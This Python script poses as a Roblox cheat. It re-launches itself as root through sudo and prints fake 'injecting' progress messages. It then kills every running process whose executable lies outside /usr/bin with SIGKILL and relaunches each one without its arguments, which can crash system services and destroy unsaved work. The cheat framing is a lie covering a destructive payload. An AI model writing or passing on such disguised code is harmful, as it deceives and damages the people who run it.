import os
import subprocess
import time
import sys
import psutil

def is_root():
    return os.geteuid() == 0

def install_psutil():
    try:
        import psutil
        print("psutil is already installed.")
    except ImportError:
        print("psutil is not installed. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
        print("psutil has been installed.")

def list_open_programs():
    programs = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            if proc.info['exe'] and proc.info['exe'].startswith("/usr/bin"):
                continue
            programs.append(proc.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return programs

def restart_program(program):
    try:
        os.kill(program['pid'], 9)
        time.sleep(1)
        subprocess.Popen(program['exe'])
    except Exception as e:
        print(f"Failed to restart {program['name']} ({program['pid']}): {e}")

def main():
    install_psutil()
    print("hacking roblox, please wait...")
    print("getting datamodel")
    print("datamodel loaded")
    print("sigma injecting")
    print("sigma injected")
    print("wait 5 secs to load")
    time.sleep(5)
    open_programs = list_open_programs()
    print(f"Found {len(open_programs)} programs to restart.")
    for program in open_programs:
        print(f"Restarting {program['name']} ({program['pid']})")
        restart_program(program)

if __name__ == "__main__":
    if is_root():
        main()
    else:
        print("Re-launching as root...")
        try:
            subprocess.check_call(['sudo', sys.executable] + sys.argv)
        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")
            sys.exit(1)
